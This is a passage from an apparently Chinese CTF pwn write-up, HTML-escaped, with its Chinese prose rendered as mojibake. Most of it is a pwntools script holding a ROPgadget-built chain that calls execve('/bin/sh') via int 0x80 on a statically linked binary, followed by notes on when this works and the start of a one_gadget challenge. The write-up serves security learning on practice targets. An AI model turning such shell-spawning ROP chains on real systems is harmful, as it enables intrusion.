&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x080549db&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# mov dword ptr [edx], eax ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0806f02a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# pop edx ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x080ea064&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# @ .data + 4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x080b81c6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# pop eax ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;//sh&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x080549db&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# mov dword ptr [edx], eax ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0806f02a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# pop edx ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x080ea068&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# @ .data + 8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x08049303&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# xor eax, eax ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x080549db&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# mov dword ptr [edx], eax ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x080481c9&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# pop ebx ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x080ea060&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# @ .data&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x080de955&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# pop ecx ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x080ea068&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# @ .data + 8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0806f02a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# pop edx ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x080ea068&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# @ .data + 8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x08049303&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# xor eax, eax ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0807a86f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# inc eax ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0807a86f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# inc eax ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0807a86f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# inc eax ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0807a86f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# inc eax ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0807a86f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# inc eax ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0807a86f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# inc eax ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0807a86f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# inc eax ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0807a86f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# inc eax ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0807a86f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# inc eax ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0807a86f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# inc eax ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0807a86f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# inc eax ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0806cc25&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# int 0x80&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;å¯ä»¥çœ‹åˆ°ï¼Œå®ƒå·²ç»å¾ˆæ™ºèƒ½çš„å¸®æˆ‘ä»¬æ„é€ å¥½äº†è¿™äº›ï¼Œæˆ‘ä»¬ä»…ä»…éœ€è¦å°†å®ƒæ„é€ å¥½çš„payloadæå–å‡ºæ¥ï¼Œç„¶åå¡«å……ä¸Šåç§»å³å¯è¿›è¡Œæˆ‘ä»¬çš„æ”»å‡»ã€‚&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªæ¯”è¾ƒç±»ä¼¼æ‚é¡¹çš„ä¸€æŠŠæ¢­çš„æ„Ÿè§‰ï¼Œåœ¨è¿™ä¸ªé˜¶æ®µä¸è¦æˆ‘ä»¬å­¦ä¼šï¼Œå½“ç„¶ç°åœ¨çš„æˆ‘ä¹Ÿä¸ä¼šï¼Œä»¥åå°±ä¼šäº†ã€‚&lt;/p&gt;
&lt;blockquote class=&#34;alert alert-note&#34;&gt;
    &lt;blockquote&gt;
&lt;p&gt;ä½¿ç”¨å‰æï¼šç¨‹åºä¸º â€œé™æ€ç¼–è¯‘â€ ä¸”æ— ç°æˆçš„ &lt;code&gt;system&lt;/code&gt;/&lt;code&gt;execve&lt;/code&gt; å‡½æ•°ã€å…³é—­ PIE ä¸”å¼€å¯ NXï¼ˆæ ˆä¸å¯æ‰§è¡Œï¼‰ã€å­˜åœ¨ â€œå¯æ§æ ˆæº¢å‡ºâ€ ä¸”æº¢å‡ºç©ºé—´è¶³å¤Ÿã€‚&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨è¯¥æŒ‡ä»¤çš„æ ¸å¿ƒåŸå› æ˜¯ç¨‹åºä¸º &lt;strong&gt;é™æ€ç¼–è¯‘&lt;/strong&gt;ï¼Œ&lt;code&gt;file pwn&lt;/code&gt; æ˜¾ç¤º &lt;code&gt;statically linked&lt;/code&gt;ï¼Œä¸”æœªç›´æ¥æä¾› &lt;code&gt;system&lt;/code&gt;ã€&lt;code&gt;execve&lt;/code&gt; ç­‰å¯ç›´æ¥ getshell çš„å‡½æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/258.png&#34;
	width=&#34;1840&#34;
	height=&#34;81&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/258_hu_c3bef381c605e654.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/258_hu_7af9f22cc3ac88ae.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;é™æ€ç¼–è¯‘&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;2271&#34;
		data-flex-basis=&#34;5451px&#34;
	
&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;é™æ€ç¼–è¯‘çš„ç¨‹åºä¼šå°†æ‰€æœ‰ä¾èµ–çš„åº“å‡½æ•°ï¼ˆå¦‚ &lt;code&gt;read&lt;/code&gt;ã€&lt;code&gt;write&lt;/code&gt;ã€&lt;code&gt;int 0x80&lt;/code&gt; ç³»ç»Ÿè°ƒç”¨å…¥å£ï¼‰æ‰“åŒ…åˆ°è‡ªèº«ä¸­ï¼Œä¸å­˜åœ¨ â€œåŠ¨æ€é“¾æ¥ä¾èµ– libcâ€ çš„é—®é¢˜ï¼Œ&lt;code&gt;ROPgadget&lt;/code&gt; èƒ½ä»ç¨‹åºè‡ªèº«æå–åˆ°å®Œæ•´çš„ ROP ç»„ä»¶ï¼ˆå¦‚ &lt;code&gt;pop edx; ret&lt;/code&gt;ã€&lt;code&gt;mov [edx], eax; ret&lt;/code&gt;ã€&lt;code&gt;int 0x80&lt;/code&gt; ç­‰ï¼‰ï¼Œè¶³ä»¥æ„é€ å‡ºè°ƒç”¨ &lt;code&gt;execve(&amp;quot;/bin/sh&amp;quot;)&lt;/code&gt; çš„å®Œæ•´ ROP é“¾ï¼›&lt;/li&gt;
&lt;li&gt;è‹¥ç¨‹åºä¸º&lt;strong&gt;åŠ¨æ€ç¼–è¯‘&lt;/strong&gt;ï¼ˆä¾èµ–å¤–éƒ¨ libcï¼‰ï¼Œä¸”æœªæ³„éœ² libc åŸºå€ï¼Œ&lt;code&gt;ROPgadget&lt;/code&gt; æ— æ³•è·å– libc å†…éƒ¨çš„ gadgetï¼ˆå¦‚ &lt;code&gt;system&lt;/code&gt; åœ°å€ã€&lt;code&gt;/bin/sh&lt;/code&gt; å­—ç¬¦ä¸²åœ°å€ï¼‰ï¼Œè‡ªåŠ¨ç”Ÿæˆçš„ ROP é“¾ä¼šå›  â€œç¼ºå°‘å…³é”®ç»„ä»¶â€ å¤±æ•ˆï¼Œæ— æ³•ç›´æ¥ä½¿ç”¨ â€œä¸€æŠŠæ¢­â€ã€‚&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;h3 id=&#34;one_&#34;&gt;&lt;strong&gt;one_gadgetæ”»å‡»&lt;/strong&gt;
&lt;/h3&gt;&lt;h3 id=&#34;pwn_074&#34;&gt;PWN_074
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šå™¢ï¼Ÿå¥½åƒåˆ°ç°åœ¨ä¸ºæ­¢è¿˜æ²¡æœ‰äº†è§£åˆ°one_gadget? &lt;a class=&#34;link&#34; href=&#34;PWN_074&#34; &gt;PWN_074&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;checksecï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/260.png&#34;
	width=&#34;811&#34;
	height=&#34;201&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/260_hu_d9ce22458a2b640e.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/260_hu_696ecee99d8fc59e.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;403&#34;
		data-flex-basis=&#34;968px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;64ä½ä¿æŠ¤å…¨å¼€&amp;hellip;.æˆ‘éƒ½æ‡µäº†ã€‚&lt;/p&gt;
&lt;p&gt;ç›¸å¯¹äºç°é˜¶æ®µï¼Œçœ‹åˆ°è¿™ç§ä¿æŠ¤å…¨å¼€çš„é¢˜å¯èƒ½ä¼šæœ‰ç‚¹è¿·èŒ«ï¼Œä½†æ˜¯å®é™…ä¸Šåœ¨å †é˜¶æ®µåé¢åŸºæœ¬ä¸Šéƒ½æ˜¯ä¿æŠ¤å…¨å¼€çš„é¢˜æ¯”è¾ƒå¤šä¸€ç‚¹ï¼Œè¿™é‡Œä¹Ÿæ˜¯ä¸ºäº†è®©å¤§å®¶æå‰äº†è§£ä¸€äº›æ”»å‡»æ‰‹æ³•ã€‚&lt;/p&gt;
